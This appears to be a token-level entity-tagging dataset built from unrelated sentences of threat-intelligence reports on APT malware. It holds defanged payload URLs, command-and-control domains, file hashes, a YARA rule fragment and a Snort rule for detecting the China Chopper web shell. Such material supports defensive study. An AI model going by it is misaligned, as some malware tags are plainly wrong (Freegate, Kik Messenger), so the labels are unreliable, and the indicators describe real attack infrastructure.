CVE-2012-0158	B-malware.backdoor
.	O

The	O
malware	O
begins	O
by	O
implementing	O
a	O
Trust	O
Manager	O
that	O
accepts	O
all	O
certificates	O
so	O
that	O
Libyan	B-malware.infosteal
Scorpions	I-malware.infosteal
hackers	O
are	O
sure	O
no	O
victim	O
left	O
disconnected	O
due	O
to	O
SSL	O
certificates	O
issues	O
.	O

hxxp://newsfairprocessing[.]com/imopo99/plugins/rpcapd.exe	B-url.unknown
hxxp://necessaries-documentation[.]com/khtergf5541/plugins/rpcapd.exe	B-url.unknown

Growing	O
threat	O
to	O
organizations	O
in	O
the	O
Middle	O
East	O

11/12	O

The	O
BlackEnergy	O
APT	O
is	O
a	O
sophisticated	O
threat	O
actor	O
that	O
is	O
known	O
to	O
have	O
used	O
at	O
least	O
one	O
zero	O
day	O
,	O
coupled	O
with	O
destructive	O
tools	O
,	O
and	O
code	O
geared	O
towards	O
attacking	O
ICS	O
systems	O
.	O

It	O
is	O
the	O
ims2	O
directory	O
that	O
is	O
the	O
most	O
active	O
.	O

'	O
_de'\.'code'/	O
$	O
strreplace	O
=	O
'	O
(	O
str_replace	O
(	O
'	O
$	O
md5	O
=	O
'	O
.substr	O
(	O
md5	O
(	O
strrev	O
(	O
'	O
$	O
gzinflate	O
=	O
'	O
gzinflate	O
'	O
$	O
cookie	O
=	O
'	O
_COOKIE	O
'	O
$	O
isset	O
=	O
'	O
isset	O
'	O
condition	O
:	O
(	O
filesize	O
>	O
20KB	O
and	O
filesize	O
<	O
22KB	O
)	O
and	O
#	O
cookie	O
==	O
2	O
and	O
#	O
isset	O
==	O
3	O
and	O
all	O
of	O
them	O

Agni	O
is	O
the	O
Hindu	O
god	O
of	O
fire	O
.	O

2	O
Jan	O
.	O

The	O
below	O
screen	O
shot	O
shows	O
the	O
base64	O
decoded	O
strings	O
associated	O
with	O
the	O
C2	O
communication	O
Below	O
is	O
the	O
description	O
of	O
the	O
decoded	O
strings	O

We	O
encourage	O
Freegate	B-malware.infosteal
to	O
follow	O
suit	O
.	O

This	O
macro	O
contains	O
three	O
functions	O
:	O
The	O
first	O
one	O
is	O
executed	O
when	O
the	O
document	O
is	O
opened	O
.	O

alert	O
tcp	O
$	O
EXTERNAL_NET	O
any	O
-	O
>	O
$	O
HTTP_SERVERS	O
$	O
HTTP_PORTS	O
(	O
msg	O
:	O
'	O
China	B-malware.backdoor
Chopper	I-malware.backdoor
with	O
first	O
Command	O
Detected	O
'	O
;	O
flow	O
:	O
to_server	O
,	O
established	O
;	O
content	O
:	O
'	O
FromBase64String	O
'	O
;	O
content	O
:	O
'	O
z1	O
'	O
;	O
content	O
:	O
'	O
POST	O
'	O
;	O
nocase	O
;	O
http_method	O
;	O
reference	B-url.unknown
:	I-url.unknown
url	I-url.unknown
,	I-url.unknown
http://www.fireeye.com/blog/technical/botnet-activities-research/2013/08/	I-url.unknown
breaking-down-the-china-chopper-web-shell-part-i.html	O
;	O
classtype	O
:	O
web-application-attack	O
;	O
sid	O
:	O
900000101	O
;	O
)	O

Have	O
a	O
look	O
at	O
the	O
'	O
ad	O
'	O
that	O
was	O
published	O
back	O
in	O
December	O
2014	O
.	O

Filename	O
:	O
main64.dll	O

In	O
this	O
year	O
's	O
campaign	O
,	O
the	O
attackers	O
use	O
an	O
upgraded	O
variant	O
of	O
this	O
malware	O
,	O
still	O
written	O
in	O
C++	O
but	O
wrapped	O
as	O
a	O
self-extracting	O
executable	O
.	O

Of	O
course	O
,	O
we	O
ca	O
n't	O
be	O
certain	O
that	O
these	O
are	O
the	O
real	O
names	O
of	O
the	O
attackers	O
.	O

A	O
few	O
months	O
ago	O
,	O
we	O
discovered	O
and	O
analyzed	O
one	O
of	O
their	O
latest	O
backdoors	O
.	O

We	O
would	O
also	O
like	O
to	O
acknowledge	O
Privacy	O
International	O
for	O
their	O
continued	O
work	O
and	O
graciously	O
provided	O
background	O
information	O
on	O
Gamma	O
International	O
.	O

(	O
102	O
)	O
Beers	O
with	O
Talos	O
EP33	O
-	O
Change	O
the	O
Conversation	O
or	O
...	O
Threat	O
Roundup	O
for	O
July	O
6-13	O
Advanced	O
Mobile	O
Malware	O
Campaign	O
in	O
India	O
uses	O
Mal	O
...	O
Vulnerability	O
Spotlight	O
:	O
Computerinsel	O
Photoline	O
M	O
...	O
Vulnerability	O
Spotlight	O
:	O
Multiple	O
Antenna	O
House	O
Vu	O
...	O
Microsoft	O
Patch	O
Tuesday	O
-	O
July	O
2018	O
Vulnerability	O
Spotlight	O
:	O
Multiple	O

Do	O
n't	O
talk	O
to	O
strangers	O
.	O

To	O
scan	O
a	O
single	O
machine	O
:	O
To	O
scan	O
multiple	O
machines	O
:	O
To	O
automatically	O
attempt	O
a	O
clean	O
operation	O
:	O
To	O
scan	O
a	O
list	O
of	O
machines	O
in	O
a	O
.txt	O
fi	O
le	O
:	O
DETECTION	O
OF	O
AURORA	B-malware.infosteal
THREATS	O
WITH	O
DIGITAL	O
DNA	O
FOR	O
EPO	O

of	O
Sample	O
B	O
is	O
as	O
follows	O
:	O

Fake	O
Datasettings	O
SHA256	O
:	O

http://www.codeproject.com/Articles/30815/An-Anti-Reverse-Engineering-Guide	B-url.normal
Clearsky	O
is	O
a	O
cybersecurity	O
consulting	O
and	O
intelligence	O
company	O
.	O

Cobalt	O
Strike1.47	O
Relieved	O
multiple	O
Beacon	O
information	O
backlog	O
;	O
had	O
a	O
overall	O
check	O
when	O
dictograph	O
was	O
on	O
.	O

The	O
malware	O
also	O
retrieves	O
instructions	O
from	O
the	O
mail	O
server	O
.	O

First	O
Minsk	O
Ceasefire	O
Minsk	O
II	O
Protocol	O
Collapses	O
signed	O
Targeted	O
intrusions	O
against	O
Ukraine	O
's	O
Ministry	O
of	O
Defense	O
Developer	O
of	O
benign	O
app	O
promoted	O
within	O
Ukrainian	O
military	O
Pro-Russian	O
Hacktivist	O
Group	O
Sprut	O
Emerges	O
Reported	O
testing	O
period	O
for	O
ArtOS	O

In	O
July	O
2011	O
SK	O
Communications	O
became	O
the	O
victim	O
of	O
an	O
attack	O
that	O
resulted	O
in	O
the	O
loss	O
of	O
the	O
personal	O
details	O
of	O
35	O
million	O
users.The	O
users	O
of	O
CyWorld	O
and	O
Nate	O
,	O
services	O
owned	O
by	O
SK	O
Communications	O
,	O
were	O
affected	O
by	O
this	O
attack	O
.	O

18	O

7/10	O
8/10	O

The	O
means	O
the	O
victim	O
most	O
likely	O
will	O
not	O
notice	O
the	O
theft	O
of	O
the	O
.HWP	O
file	O
.	O

As	O
stated	O
in	O
the	O
blog	O
,	O
the	O
attacks	O
are	O
suspected	O
of	O
originating	O
from	O
the	O
website	O
of	O
the	O
Polish	O
Financial	O
Supervision	O
Authority	O
(	O
knf.gov[.]pl	O
)	O
,	O
shown	O
below	O
:	O
From	O
at	O
least	O
2016-10-07	O
to	O
late	O
January	O
the	O
website	O
code	O
had	O
been	O
modified	O
to	O
cause	O
visitors	O
to	O
download	O
malicious	O
JavaScript	O
files	O
from	O
the	O
following	O
locations	O
:	O

However	O
,	O
when	O
one	O
takes	O
a	O
closer	O
look	O
at	O
the	O
way	O
DarkComet	B-malware.backdoor
stores	O
this	O
string	O
,	O
we	O
see	O
that	O
the	O
\r	O
and	O
\n	O
characters	O
are	O
not	O
actually	O
CR	O
(	O
0x0D	O
)	O
and	O
LF	O
(	O
0x0A	O
)	O
bytes	O
.	O

The	O
hashing	O
algorithm	O
is	O
different	O
from	O
the	O
simple	O
XOR/ROL	O
technique	O
Bunny	B-malware.unknown
uses	O
.	O

It	O
uses	O
a	O
COM	O
port	O
for	O
UAC	O
bypass	O
,	O
copying	O
its	O
own	O
DLL	O
to	O
the	O
System32	O
path	O
for	O
DLL	O
hijacking	O
,	O
and	O
the	O
hijacked	O
targets	O
are	O
cliconfg.exe	O
and	O
SearchProtocolHost.exe	O
.	O

ini.php	O
wso	B-malware.backdoor
shell+	I-malware.backdoor
mail	O
mysql.php	O
wso	O
shell+	O
mail	O
opts.php	O
wso	B-malware.backdoor
shell	O
error_	O
log.php	O
wso	B-malware.backdoor
shell	O
code29.php	O
web	O
shell	O
proxy87	O
.php	O
web	O
shell	O
theme.php	O
wso	B-malware.backdoor
shell	O
sma.php	O
PHPMailer	O
media.php	O
wso	B-malware.backdoor
shell	O
f3e3e25a822012	B-hash
023c6e81b2067	I-hash
11865	I-hash
f3e3e25a822012	B-hash
023c6e81b2067	I-hash
11865	I-hash
c7	B-hash
647	I-hash
0e85b7	I-hash
f3	I-hash
da46539b40e5c	I-hash
5527	I-hash
12	I-hash
155385cc19e309	B-hash
27	I-hash
65bcfed034b	I-hash
82ccb	I-hash
1644af9b6424e	B-hash
8f58f39c7	I-hash
fa5e7	I-hash
6de51	I-hash
1644af9b6424e	B-hash
8f58f39c7	I-hash
fa5e7	I-hash
6de51	I-hash
2292f5db38506	B-hash
8e161ae27	I-hash
7	I-hash
531	I-hash
b2e114	I-hash
7	O
ec514bbdc6dd	B-hash
8f606f803d39af	I-hash
8883f	I-hash
7	O
8c31eff38fdb7	B-hash
2ea3b1800ea91	I-hash
7	I-hash
940f	I-hash
2016-07	O
-01	O
15:57	O
:38	O
2016-06-12	O
13:35:30	O
2016-06-12	O
12:23:28	O
2016-06-12	O
10:59:39	O
2016-06-12	O
11:10:40	O
2016-06-12	O
14:31:13	O
2017	O
-05-16	O
17	O
:33:02	O
2017	O
-05-19	O
13:53:53	O
2017	O
-04-17	O
15:58:41	O
287	O
86	O
287	O
86	O
36623	O
36636	O
107	O
24	O
107	O
24	O
133104	O
14696	O
17	O
62986	O
In	O
the	O
table	O
above	O
:	O
Web	B-malware.backdoor
shell	O
is	O
a	O
script	O
that	O
allows	O
remote	O
administration	O
of	O
the	O
machine	O
.	O

Chafer	O
has	O
also	O
continued	O
to	O
use	O
tools	O
previously	O
associated	O
with	O
the	O
group	O
,	O
including	O
its	O
own	O
custom	O
backdoor	O
Remexi	B-malware.backdoor
(	O
Backdoor.Remexi	B-malware.backdoor
(	O
https://www.symantec.com/security_response/writeup.jsp?docid=2015-110911-3433-99	B-url.normal
)	O
)	O
;	O
the	O
aforementioned	O
PsExec	O
;	O
Mimikatz	O
(	O
Hacktool.Mimikatz	O
(	O
https://www.symantec.com/security_response/writeup.jsp?docid=2012-042615-3731-99	B-url.normal
)	O
)	O
,	O
a	O
free	O
tool	O
capable	O
of	O
changing	O
privileges	O
,	O
exporting	O
security	O
certi cates	O
,	O
and	O
recovering	O
Windows	O
passwords	O
in	O
plaintext	O
;	O
Pwdump	O
(	O
Pwdump	O
(	O
https://www.symantec.com/security_response/writeup.jsp?docid=2005-032616-0025-99	B-url.normal
)	O
)	O
a	O
tool	O
that	O
is	O
used	O
to	O
grab	O
Windows	O
password	O
hashes	O
from	O
a	O
remote	O
Windows	O
computer	O
;	O
and	O
Plink	O
(	O
PuTTY	O
Link	O
)	O
a	O
command-line	O
utility	O
used	O
to	O
create	O
reverse	O
SSH	O
sessions	O
.	O

Antiy	O
's	O
engines	O
are	O
embedded	O
in	O
tens	O
of	O
thousands	O
of	O
firewalls	O
and	O
tens	O
of	O
millions	O
of	O
mobile	O
phones	O
all	O
over	O
the	O
world	O
.	O

Figure	O
11	O
.	O

IoT	O
hacks	O
,	O
and	O
operational	O
disruptions	O
.	O

Accenture	O
is	O
a	O
leading	O
global	O
professional	O
services	O
company	O
,	O
providing	O
a	O
broad	O
range	O
of	O
services	O
and	O
solutions	O
in	O
strategy	O
,	O
consulting	O
,	O
digital	O
,	O
technology	O
and	O
operations	O
.	O

The	O
ZIP	O
archive	O
contains	O
a	O
malicious	O
portable	O
executable	O
(	O
PE	O
)	O
file	O
with	O
embedded	O
HTML	O
application	O
(	O
HTA	O
)	O
.	O

-	O
uploads	O
a	O
file	O
#	O
newdownload	O
?	O

Inception	B-malware.backdoor
has	O
an	O
ongoing	O
interest	O
in	O
mobile	O
devices	O
and	O
has	O
previously	O
developed	O
malware	O
to	O
infect	O
Android	O
(	O
Android.Lastacloud	O
(	O
https://www.symantec.com/security_response/writeup.jsp?docid=2014-121216-4334-99	B-url.unknown
)	O
)	O
,	O
iOS	O
(	O
IOS.Lastaccoud	O
(	O
https://www.symantec.com/security_response/writeup.jsp?docid=2014-121216-5858-99	B-url.unknown
)	O
)	O
and	O
BlackBerry	O
devices	O
(	O
BBOS.Lastacloud	O
(	O
https://www.symantec.com/security_response/writeup.jsp?docid=2014-121913-0103-99	B-url.unknown
)	O
)	O
.	O

HASH	B-hash
(	O
SHA256	O
)	O
DATE	O
DISPOSITION	O
APT	B-malware.unknown

The	O
first	O
consists	O
of	O
CozyDuke	B-malware.drop
modules	O
which	O
are	O
DLL	O
files	O
loaded	O
in	O
memory	O
by	O
the	O
main	O
component	O
of	O
CozyDuke	B-malware.drop
for	O
the	O
purposes	O
of	O
extending	O
CozyDuke	B-malware.drop
's	O
functionality	O
.	O

Specifically	O
,	O
the	O
attacker	O
can	O
not	O
provide	O
a	O
decryption	O
key	O
and	O
the	O
decryption	O
key	O
can	O
not	O
be	O
typed	O
in	O
the	O
ransom	O
screen	O
,	O
because	O
the	O
generated	O
key	O
contains	O
non-acceptable	O
characters	O
.	O

Use	O
of	O
password	O
protected	O
macro	O
to	O
prevent	O
viewing	O
the	O
code	O
and	O
to	O
make	O
manual	O
analysis	O
harder	O
Use	O
of	O
TextBox	O
within	O
the	O
UserForm	O
to	O
store	O
malicious	O
content	O
to	O
bypass	O
analysis	O
tools	O
Use	O
of	O
legitimate	O
service	O
like	O
Google	O
drive	O
to	O
store	O
the	O
list	O
of	O
back	O
up	O
C2	O
servers	O
to	O
bypass	O
security	O
monitoring	O
and	O
reputation	O
based	O
devices	O
.	O

The	O
code	O
inside	O
the	O
box	O
constructs	O
the	O
main	O
Powershell	O
commands	O
and	O
scripts	O
.	O

Each	O
step	O
of	O
each	O
part	O
of	O
the	O
process	O
will	O
be	O
explained	O
in	O
detail	O
in	O
its	O
respective	O
section	O
.	O

If	O
the	O
fraudulent	O
transaction	O
confirmations	O
are	O
printed	O
out	O
,	O
the	O
banking	O
officials	O
can	O
spot	O
an	O
anomaly	O
and	O
then	O
respond	O
appropriately	O
to	O
stop	O
such	O
transactions	O
from	O
happening	O
.	O

4db3801a45802041baa44334303e0498c2640cd5dfd6892545487bf7c8c9219f	B-hash
ThreatFire	O
522e5549af01c747329d923110c058b7bb7e112816de64bd7919d7b9194fba5b	B-hash
Rising	O
2fd5c42d49f9e0fe2daae5b0f78cf9cfde9bfc7b0ed59fc68e0a79a3b16fe05b	B-hash
06e387bb79584cdff3672feadea0bf6f783ce1ddc1fa91962d1b5bcd94e1a308	B-hash
f1761a5e3856dceb3e14d4555af92d3d1ac47604841f69fc72328b53ab45ca56	B-hash
Kaspersky	O
588730213eb6ace35caadcb651217bfbde3f615d94a9cca41a31ee9fa09b186c	B-hash
ZoneAlarm	O
c8e8248940830e9f1dc600c189640e91c40f95caae4f3187fb04427980cdc479	B-hash
b3fe0e3a3e3befa152c4237b0f3a96ffaa44a2d7e1aa6d379d3a1ab4659e1676	B-hash
AntiVir	O

As	O
of	O
June	O
20	O
,	O
2013	O
,	O
svchost.exe	B-malware.drop
was	O
only	O
detected	O
by	O
four	O
out	O
of	O
47	O
tested	O
anti-virus	O
programs	O
,	O
while	O
VPN-Pro.exe	B-malware.drop
was	O
only	O
detected	O
by	O
five	O
out	O
of	O
46	O
.	O

APT28	B-malware.infosteal
employs	O
a	O
suite	O
of	O
malware	O
with	O
features	O
indicative	O
of	O
the	O
group	O
's	O
plans	O
for	O
continued	O
operations	O
,	O
as	O
well	O
as	O
the	O
group	O
's	O
access	O
to	O
resources	O
and	O
skilled	O
developers	O
.	O

Four	O
of	O
the	O
16	O
short	O
links	O
were	O
clicked	O
,	O
three	O
by	O
the	O
senior	O
staff	O
members	O
.	O

This	O
image	O
appears	O
purportedly	O
to	O
be	O
of	O
Gilad	O
Shalit	O
in	O
his	O
hostage	O
cell	O
.	O

Higher	O
success	O
rates	O
with	O
less	O
risk	O
of	O
discovery	O
:	O
Due	O
to	O
the	O
minimally	O
required	O
user	O
interaction	O
,	O
users	O
do	O
not	O
get	O
suspicious	O
of	O
the	O
document	O
as	O
easily	O
and	O
therefore	O
do	O
not	O
report	O
the	O
situation	O
to	O
internal	O
security	O
teams	O
.	O

Microsoft	O
Office	O
users	O
should	O
apply	O
the	O
patch	O
from	O
Microsoft	O
as	O
soon	O
as	O
possible	O
,	O
if	O
they	O
have	O
not	O
already	O
installed	O
it	O
.	O

This	O
technique	O
has	O
also	O
been	O
used	O
by	O
PlugX	B-malware.unknown
before	O
.	O

A	O
few	O
days	O
ago	O
CSIS	O
published	O
details	O
about	O
new	O
Carbanak	B-malware.infosteal
samples	O
found	O
in	O
the	O
wild	O
.	O

As	O
part	O
of	O
an	O
ongoing	O
TCIRT	O
focused	O
research	O
and	O
analysis	O
,	O
we	O
have	O
found	O
custom	O
malware	O
being	O
used	O
operationally	O
'	O
in	O
the	O
wild	O
'	O
that	O
may	O
be	O
targeting	O
Indian	O
military	O
and	O
government	O
related	O
entities	O
,	O
as	O
well	O
as	O
other	O
unidentified	O
South	O
Asian	O
targets	O
.	O

The	O
latter	O
may	O
be	O
obscure	O
technical	O
slang	O
or	O
be	O
a	O
misuse	O
signifying	O
a	O
potential	O
false	O
flag	O
.	O

2016	O
.	O

[	O
그림	O
23	O
]	O
안다리엘	O
그룹	O
악성코드의	O
암호화	O
방식	O
안랩	O
V3	O
제품군에서는	O
안다리엘	O
그룹과	O
관련된	O
악성코드를	O
다음과	O
같은	O
진단명으로	O
탐지하고	O
있다	O
.	O

This	O
is	O
an	O
attack	O
objective	O
not	O
typically	O
seen	O
from	O
cyber-crime	O
groups	O
.	O

The	O
certificate	O
and	O
update	O
naming	O
convention	O
is	O
also	O
designed	O
to	O
trick	O
the	O
user	O
.	O

We	O
discovered	O
some	O
interesting	O
characteristics	O
.	O

As	O
of	O
this	O
publication	O
,	O
dnc.org	O
does	O
not	O
use	O
the	O
Google	O
Apps	O
Gmail	O
email	O
service	O
.	O

Transfers	O
using	O
MT103	O
messages	O
were	O
sent	O
from	O
FEIB	O
to	O
Cambodia	O
,	O
the	O
US	O
and	O
Sri	O
Lanka	O
.	O

The	O
attack	O
is	O
split	O
in	O
two	O
parts	O
:	O
the	O
dropper	O
and	O
backdoor	O
launcher	O
.	O

The	O
Cyber	O
Security	O
Advisors	O
(	O
CSA	O
)	O
program	O
bolsters	O
cybersecurity	O
preparedness	O
,	O
risk	O
mitigation	O
,	O
and	O
incident	O
response	O
capabilities	O
of	O
critical	O
infrastructure	O
entities	O
and	O
more	O
closely	O
aligns	O
them	O
with	O
the	O
Federal	O
Government	O
.	O

The	O
malware	O
scans	O
the	O
computer	O
for	O
files	O
that	O
contain	O
certain	O
keywords	O
.	O

In	O
case	O
the	O
hook	O
was	O
installed	O
,	O
the	O
line	O
is	O
'	O
Started	O
...	O
'	O
,	O
else	O
'	O
LoadLibrary	O
'	O
%	O
path	O
to	O
its	O
file	O
%	O
'	O
failed	O
,	O
%	O
error	O
code	O
%	O
'	O
.	O

Mshta.exe	O
is	O
often	O
used	O
by	O
malware	O
to	O
run	O
VBscript	O
for	O
malicious	O
purposes	O
,	O
but	O
using	O
it	O
for	O
downloading	O
a	O
general	O
purpose	O
payload	O
is	O
not	O
so	O
common	O
.	O

MESG_SENDER_SWIFT_ADDRESS	O
from	O
that	O
same	O
message	O
by	O
looking	O
for	O
the	O
following	O
hard	O
coded	O
strings	O
:	O

File	O
name	O
SHA-1	O

They	O
could	O
also	O
be	O
security	O
researchers	O
or	O
vendors	O
who	O
are	O
trying	O
to	O
get	O
information	O
from	O
VirusTotal	O
.	O

E7E05001A294EBFE8A012DD3BCE78E96	B-hash
may2008.dyndns.biz	B-url.cncsvr

The	O
additional	O
key	O
logger	O
module	O
is	O
not	O
very	O
complex	O
--	O
it	O
simply	O
intercepts	O
keystrokes	O
and	O
writes	O
typed	O
keys	O
into	O
C	O
:	O
Program	O
FilesCommon	O
FilesSystemOle	O
DBmsolui80.inc	O
,	O
and	O
also	O
records	O
the	O
active	O
window	O
name	O
where	O
the	O
user	O
pressed	O
keys	O
.	O

You	O
can	O
also	O
select	O
a	O
host	O
and	O
type	O
help	O
for	O
a	O
full	O
list	O
of	O
commands	O
.	O

This	O
section	O
of	O
code	O
crashes	O
the	O
popular	O
debugger	O
,	O
OllyDbg	O
.	O

All	O
rights	O
reserved	O
.	O

A	O
DataStore	O
is	O
a	O
map	O
from	O
string	O
keys	O
to	O
values	O
of	O
8	O
possible	O
types	O
,	O
such	O
as	O
integers	O
or	O
strings	O
.	O

Figure	O
10	O
–	O
List	O
of	O
target	O
file	O
extensions	O
from	O
Diskcoder.C	O
.	O

The	O
adversary	O
then	O
used	O
this	O
profile	O
information	O
,	O
in	O
conjunction	O
with	O
the	O
name	O
'	O
Pravyy	O
Sector	O
,	O
'	O
to	O
make	O
it	O
appear	O
as	O
though	O
the	O
extortion	O
threats	O
against	O
the	O
Polish	O
government	O
were	O
originating	O
from	O
an	O
ultranationalist	O
Ukrainian	O
group	O
.	O

Meta	O
Refresh	O
Page	O

This	O
story	O
is	O
about	O
one	O
of	O
those	O
cases	O
.	O

The	O
main	O
functions	O
of	O
the	O
backdoor	O
infoClient	O
fills	O
up	O
the	O
variables	O
in	O
HandlePP	O
class	O
.	O

This	O
attacker	O
put	O
significant	O
effort	O
into	O
deleting	O
evidence	O
of	O
their	O
activities	O
,	O
subverting	O
normal	O
business	O
processes	O
to	O
remain	O
undetected	O
and	O
hampering	O
the	O
response	O
from	O
the	O
victim	O
.	O

Media	O
Grabbing	O

In	O
this	O
case	O
,	O
it	O
appears	O
the	O
actor	O
used	O
the	O
ID	O
field	O
to	O
record	O
the	O
type	O
of	O
attack	O
delivered	O
(	O
docx	O
)	O
and	O
the	O

Ability	O
to	O
receive	O
PowerShell	O
script	O
from	O
the	O
C2	O
server	O
and	O
execute	O
on	O
the	O
machine	O
.	O

Found	O
in	O
Israel	O
Word	O
document	O
,	O
contained	O
in	O
SFX	O
RAR	O
file	O
72fd6074915f8f123eb44b3dd475d36b	B-hash

With	O
a	O
network	O
defense	O
strategy	O
of	O
pursuit	O
and	O
deterrence	O
in	O
mind	O
,	O
root9B	O
operators	O
conduct	O
Active	O
Adversary	O
Pursuit	O
(	O
HUNT	O
)	O
operations	O
as	O
a	O
tailored	O
solution	O
for	O
cyber	O
security	O
teams	O
.	O

The	O
spear	O
phishing	O
emails	O
and	O
attached	O
malicious	O
macro	O
documents	O
typically	O
have	O
geopolitical	O
themes	O
.	O

quickly	O
lost	O
interest	O
and	O
stopped	O
replying	O
to	O
him	O
altogether	O
.	O

This	O
server	O
was	O
also	O
located	O
in	O
the	O
Guangdong	O
Province	O
and	O
operated	O
by	O
CHINANET	O
.	O

The	O
website	O
also	O
hosted	O
this	O
malware	O
:	O
afd5288d9aeb0c3ef7b37becb7ed4d5c	B-hash
.	O

exploits	O
eyjafjallajoekull	O
fake	O
alert	O
firefox	O

short	O
module_id	O
;	O

SHA1	O
SHA256	O
1c076413cca929b7004863f1a3992afda665786d6e179b9886ddeb8062194049	B-hash
1f4d22e5131a66aa24f44eb0d4f1b54d	B-hash
2c8a144331ec124755413f31a83e21015c74f2ec	B-hash

Exhibit	O
6	O
:	O
Message	O
box	O
with	O
a	O
taunting	O
message	O
Exhibit	O
7	O
:	O
Message	O
box	O
with	O
another	O
taunting	O
message	O

Then	O
,	O
the	O
attackers	O
sent	O
a	O
link	O
to	O
the	O
victims	O
,	O
that	O
led	O
to	O
a	O
phishing	O
website	O
,	O
which	O
hosted	O
a	O
downloadable	O
and	O
malicious	O
version	O
of	O
the	O
Kik	B-malware.infosteal
Messenger	I-malware.infosteal
app	O
.	O

Babar	B-malware.unknown
,	O
an	O
espionage	O
platform	O
,	O
also	O
analyzed	O
by	O
Marion	O
Marschalek	O

@	O
!	O
#	O
'	O
string	O
is	O
maintained	O
across	O
all	O
known	O
samples	O
and	O
is	O
used	O
to	O
generate	O
RC4	O
keys	O
.	O

Other	O
groups	O
that	O
are	O
more	O
nervous	O
about	O
exposure	O
go	O
in	O
a	O
hibernation	O
mode	O
for	O
months	O
or	O
years	O
.	O

8AEAA0C81A36449EC9613CA846E196F2	B-hash
menu.dyndns.biz	B-url.cncsvr

There	O
is	O
no	O
clear-cut	O
answer	O
here	O
.	O

Unlike	O
most	O
Flash	B-malware.unknown
exploits	O
delivered	O
with	O
Microsoft	O
Office	O
,	O
this	O
document	O
uses	O
a	O
lesser-known	O
feature	O
to	O
remotely	O
include	O
all	O
SWF	O
content	O
from	O
the	O
attacker	O
's	O
server	O
instead	O
of	O
embedding	O
it	O
directly	O
in	O
the	O
document	O
.	O

While	O
sending	O
to	O
the	O
C2	O
server	O
,	O
the	O
data	O
is	O
formatted	O
as	O
follows	O
:	O
@	O
{	O
SYSINFO	O
=	O
$	O
get	O
.	O

Based	O
on	O
our	O
observations	O
we	O
propose	O
one	O
or	O
more	O
of	O
the	O
following	O
possible	O
explanations	O
:	O
1	O
.	O

Figure	O
14	O
Comparison	O
of	O
Module	O
1	O

Payment	B-malware.infosteal
details.jar	I-malware.infosteal

Attackers	O
typically	O
embed	O
a	O
Flash	O
file	O
within	O
a	O
document	O
,	O
which	O
may	O
contain	O
the	O
entire	O
exploit	O
,	O
or	O
may	O
stage	O
the	O
attack	O
to	O
download	O
exploits	O
and	O
payloads	O
more	O
selectively	O
(	O
e.g.	O
APT28/Sofacy	O
DealersChoice	B-malware.drop
)	O
.	O

Note	O
that	O
the	O
domain	O
being	O
impersonated	O
is	O
that	O
of	O
Israel	O
Electric	O
Company	O
's	O
website	O
(	O
iec.co.il	B-url.unknown
)	O
.	O

McAfee	O
SiteAdvisor	O
,	O
SiteAdvisor	O
Plus	O
,	O
SiteAdvisor	O
Enterprise.TrustedSource	O
has	O
coverage	O
for	O
domains	O
and	O
IP	O
addresses	O
that	O
the	O
malware	O
contacts	O
.	O

The	O
malicious	O
.DLL	B-malware.backdoor
(	O
also	O
named	O
)	O
is	O
loaded	O
instead	O
of	O
the	O
legitimate	O
copy	O
.	O

Once	O
it	O
downloads	O
the	O
updated	O
executable	O
then	O
the	O
malware	O
creates	O
a	O
value	O
in	O
the	O
Run	O
registry	O
key	O
for	O
persistence	O
,	O
before	O
that	O
it	O
deletes	O
the	O
old	O
entry	O
and	O
adds	O
the	O
new	O
entry	O
so	O
that	O
next	O
time	O
when	O
the	O
system	O
starts	O
the	O
updated	O
executable	O
will	O
run	O
.	O

The	O
analysts	O
and	O
tools	O
that	O
enabled	O
this	O
to	O
happen	O
are	O
unique	O
and	O
proprietary	O
.	O

Ensure	O
error	O
messages	O
are	O
generic	O
and	O
do	O
not	O
expose	O
too	O
much	O
information	O
.	O

S	O
:	O
KeepAlive	O
|	O
27120274	O

The	O
tools	O
are	O
highly	O
configurable	O
and	O
given	O
the	O
correct	O
access	O
could	O
feasibly	O
be	O
used	O
for	O
similar	O
attacks	O
in	O
the	O
future	O
.	O

It	O
seems	O
to	O
be	O
based	O
on	O
SHA-1	O
,	O
but	O
generates	O
32-bit	O
hashes	O
instead	O
of	O
the	O
standard	O
160-bit	O
length	O
.	O

The	O
PlugX	O
sample	O
connects	O
to	O
the	O
blog	O
and	O
parses	O
the	O
page	O
for	O
a	O
command	O
for	O
where	O
to	O
connect	O
to	O
next	O
.	O

After	O
connecting	O
,	O
China	B-malware.backdoor
Chopper	I-malware.backdoor
also	O
provides	O
useful	O
SQL	O
commands	O
.	O

Ok	O
,	O
we	O
admit	O
that	O
the	O
German	O
word	O
'	O
Kraftfahrzeughaftpflichtversicherung	O
'	O
(	O
36	O
)	O
would	O
not	O
be	O
harmed	O
when	O
copied	O
,	O
but	O
what	O
about	O
'	O
Bundesausbildungsfoerderungsgesetz	O
'	O
(	O
34	O
)	O
or	O
'	O
radioimmunoelectrophoresis	O
'	O
(	O
27	O
)	O
?	O

2014-05-21	O

Hashes	O
detected	O
as	O
part	O
of	O
the	O
BKDR_ANEL	B-malware.backdoor
Family	O
:	O

The	O
Sejong	O
Institute	O

Sample	O
:	O
1be9c68b31247357328596a388010c9cfffadcb6e9841fb22de8b0dc2d161c42	B-hash
(	O
Note	O
:	O
At	O
the	O
time	O
of	O
this	O
report	O
,	O
the	O
C2	O
for	O
the	O
sample	O
was	O
active	O
and	O
the	O
malware	O
could	O
still	O
establish	O
an	O
active	O
connection	O
to	O
the	O
Ghost	O
Dragon	O
controller	O
at	O
bbs.winupdate[.]net	B-url.cncsvr
.	O

This	O
shows	O
a	O
GET	O
request	O
made	O
to	O
:	O

However	O
,	O
at	O
the	O
same	O
time	O
,	O
the	O
threat	O
actors	O
behind	O
Operation	O
Cobalt	O
Kitty	O
left	O
enough	O
'	O
behavioral	O
fingerprints	O
'	O
to	O
suspect	O
the	O
involvement	O
of	O

However	O
,	O
the	O
application	O
does	O
not	O
do	O
anything	O
.	O

'	O
WADA	O
Confirms	O
Attack	O
by	O
Russian	O
Cyber	O
Espionage	O
Group	O
.	O
'	O

01197697e554021af1ce7e980a5950a5fcf88318	B-hash

The	O
malware	O
package	O
used	O
with	O
Aurora	B-malware.infosteal
is	O
mature	O
and	O
been	O
in	O
development	O
since	O
at	O
least	O
2006	O
.	O

Looking	O
at	O
whether	O
any	O
other	O
domains	O
or	O
IP	O
addresses	O
were	O
observed	O
delivering	O
malicious	O
software	O
via	O
gokbayrak.com	B-url.unknown
shows	O
that	O
it	O
was	O
also	O
observed	O
delivering	O
malware	O
via	O
88.80.190[.]133	B-ip.unknown
.	O

At	O
the	O
time	O
of	O
this	O
post	O
,	O
the	O
domain	O
is	O
hosted	O
on	O
the	O
Japanese	O
IP	O
address	O
